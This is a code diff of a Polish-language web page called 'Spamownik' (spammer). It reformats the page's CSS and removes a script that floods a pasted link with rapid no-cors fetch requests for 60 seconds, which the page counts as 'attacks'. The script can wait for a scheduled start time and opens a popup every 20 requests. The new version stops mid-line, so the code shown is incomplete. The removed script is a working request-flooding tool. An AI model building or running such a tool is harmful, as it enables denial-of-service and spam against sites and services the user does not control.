@@ -22,108 +22,37 @@
       padding: 40px 20px;
     }
 
-    h1 {
-      font-size: 1.1rem;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 25px;
-      line-height: 1.5;
-    }
+    h1 { font-size: 1.1rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 25px; line-height: 1.5; }
 
     #linkInput {
-      width: 100%;
-      padding: 15px;
-      background: var(--input-bg);
-      border: 1px solid var(--border-color);
-      color: #fff;
-      border-radius: 8px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      box-sizing: border-box;
+      width: 100%; padding: 15px; background: var(--input-bg); border: 1px solid var(--border-color);
+      color: #fff; border-radius: 8px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box;
     }
 
     .settings-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
-      background: var(--bg-black);
-      padding: 20px;
-      border-radius: 12px;
-      border: 1px solid #222;
-      align-items: end;
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; background: var(--bg-black);
+      padding: 20px; border-radius: 12px; border: 1px solid #222; align-items: end;
     }
 
-    .form-group {
-      display: flex;
-      flex-direction: column;
-      text-align: left;
-    }
-
+    .form-group { display: flex; flex-direction: column; text-align: left; }
     .full-width { grid-column: span 3; }
 
-    label {
-      font-size: 11px;
-      font-weight: bold;
-      margin-bottom: 6px;
-      color: #888;
-      text-transform: uppercase;
-    }
+    label { font-size: 11px; font-weight: bold; margin-bottom: 6px; color: #888; text-transform: uppercase; }
 
     input, select {
-      background: var(--input-bg);
-      border: 1px solid var(--border-color);
-      color: #fff;
-      padding: 12px;
-      border-radius: 6px;
-      font-size: 14px;
-      width: 100%;
-      box-sizing: border-box;
+      background: var(--input-bg); border: 1px solid var(--border-color); color: #fff;
+      padding: 12px; border-radius: 6px; font-size: 14px; width: 100%; box-sizing: border-box;
     }
 
-    .button-container {
-      grid-column: span 3;
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 15px;
-      margin-top: 10px;
-    }
+    .button-container { grid-column: span 3; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px; }
 
-    .btn {
-      color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-      border: none;
-      padding: 16px;
-      border-radius: 6px;
-      font-size: 16px;
-      transition: all 0.2s ease;
-      text-transform: uppercase;
-    }
+    .btn { color: #fff; font-weight: bold; cursor: pointer; border: none; padding: 16px; border-radius: 6px; font-size: 16px; transition: all 0.2s ease; text-transform: uppercase; }
+    .btn-start { background-color: var(--primary-red); }
+    .btn-start:hover { background-color: var(--hover-red); box-shadow: 0 0 15px rgba(255, 0, 0, 0.4); }
+    .btn-stop { background-color: #333; }
+    .btn-stop:hover { background-color: #444; }
 
-    .btn-start {
-      background-color: var(--primary-red);
-    }
-
-    .btn-start:hover {
-      background-color: var(--hover-red);
-      box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
-    }
-
-    .btn-stop {
-      background-color: #333;
-    }
-
-    .btn-stop:hover {
-      background-color: #444;
-    }
-
-    #status {
-      margin-top: 30px;
-      font-size: 22px;
-      font-weight: bold;
-      border-top: 1px solid #222;
-      padding-top: 20px;
-    }
+    #status { margin-top: 30px; font-size: 22px; font-weight: bold; border-top: 1px solid #222; padding-top: 20px; }
 
     @media (max-width: 768px) {
       .settings-grid { grid-template-columns: 1fr 1fr; }
@@ -254,11 +183,7 @@
   <div id="status">Wysłane ataki: 0</div>
 
   <script>
-    let openedCount = 0;
-    let nextAttackTimer;
-    let countdown;
-    let secondsLeft = 60;
-    let isRunning = false;
+    let openedCount = 0; let nextAttackTimer; let countdown; let secondsLeft = 60; let isRunning = false;
 
     function selectLink(selectElement) {
       const selectedLink = selectElement.value;
@@ -266,75 +191,11 @@
     }
 
     function stopSpam() {
-      isRunning = false;
-      clearTimeout(nextAttackTimer);
-      clearInterval(countdown);
+      isRunning = false; clearTimeout(nextAttackTimer); clearInterval(countdown);
       document.getElementById("status").innerText += " (ZATRZYMANO)";
       document.title = "Zatrzymano - Spamownik";
     }
 
     function planOrStart() {
       const timeInput = document.getElementById("startTime").value;
-      const link = document.getElementById("linkInput").value;
-      if (!link) { alert("Wklej link!"); return; }
-
-      if (timeInput) {
-        const ms = new Date(timeInput) - new Date();
-        if (ms <= 0) { alert("Godzina już minęła!"); return; }
-        document.getElementById("status").innerText = `Czekam do ${new Date(timeInput).toLocaleTimeString()}...`;
-        setTimeout(() => startSpam(link), ms);
-      } else {
-        startSpam(link);
-      }
-    }
-
-    function startSpam(link) {
-      isRunning = true;
-      openedCount = 0;
-      secondsLeft = 60;
-      clearTimeout(nextAttackTimer);
-      clearInterval(countdown);
-
-      const attemptsLimit = parseInt(document.getElementById("attemptsLimit").value);
-      const limitByAttempts = !isNaN(attemptsLimit) && attemptsLimit > 0;
-      const minI = parseInt(document.getElementById("minMs").value);
-      const maxI = parseInt(document.getElementById("maxMs").value);
-      
-      const minMs = !isNaN(minI) ? minI : 120;
-      const maxMs = !isNaN(maxI) ? maxI : 120;
-
-      const performAction = () => {
-        if (!isRunning || (limitByAttempts && openedCount >= attemptsLimit) || secondsLeft <= 0) {
-          stopSpam();
-          return;
-        }
-
-        // System weryfikacji co 20 ataków (otwiera małe okno na 2 sekundy)
-        if (openedCount > 0 && openedCount % 20 === 0) {
-          const win = window.open(link, '_blank', 'width=200,height=200');
-          setTimeout(() => { if(win) win.close(); }, 2000);
-        }
-
-        fetch(link, { mode: 'no-cors' })
-          .then(() => { openedCount++; updateStatus(); })
-          .catch(() => { openedCount++; updateStatus(); });
-
-        const delay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
-        nextAttackTimer = setTimeout(performAction, delay);
-      };
-
-      const updateStatus = () => {
-        document.getElementById('status').innerText = `Wysłane ataki: ${openedCount}`;
-      };
-
-      countdown = setInterval(() => {
-        secondsLeft--;
-        document.title = `${secondsLeft}s - Atakowanie...`;
-        if (secondsLeft <= 0) stopSpam();
-      }, 1000);
-
-      performAction();
-    }
-  </script>
-</body>
-</html>
+      const link
